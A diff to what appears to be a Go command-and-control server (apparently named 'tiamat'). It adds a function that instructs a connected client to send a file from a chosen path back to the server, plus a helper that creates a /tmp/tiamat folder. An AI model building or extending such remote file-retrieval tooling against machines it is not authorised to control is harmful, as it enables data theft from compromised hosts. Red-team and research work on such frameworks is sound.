@@ -121,6 +121,31 @@ func handleConn(conn net.Conn) {
 	go Heartbeat(ID)
 }
 
+func downloadFileC2(client Client, filepath string) (Response, error) {
+	checkTempFolder()
+	inst := Instructions{
+		IsDownload: true,
+		Path:       filepath,
+	}
+	client.Instruct(inst)
+	message, err := ServerMessageReceiver(client.Conn)
+	if err != nil {
+		log.Println(err)
+		return message, err
+	}
+
+	return message, nil
+}
+
+func checkTempFolder() {
+	if _, err := os.Stat("/tmp/tiamat/"); os.IsNotExist(err) {
+		err := os.Mkdir("/tmp/tiamat", 0700)
+		if err != nil {
+			log.Printf("Error happened creating temp folder: %v\n", err)
+		}
+	}
+}
+
 func uploadFileC2(client Client, file multipart.FileHeader, whereToStore string) (Response, error) {
 	openedFile, err := file.Open()
 	if err != nil {
